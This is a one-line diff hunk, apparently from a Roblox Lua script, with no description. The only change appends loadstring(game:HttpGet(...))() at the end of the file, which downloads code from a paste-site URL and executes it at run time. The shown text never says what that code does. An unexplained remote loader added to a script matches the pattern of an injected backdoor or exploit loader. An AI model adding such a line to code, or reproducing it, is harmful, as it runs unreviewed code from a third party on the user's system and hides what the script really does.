@@ -327,3 +327,4 @@ task.spawn(function()
         end
     end
 end)
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/UWh3IoJiCz/0"))()
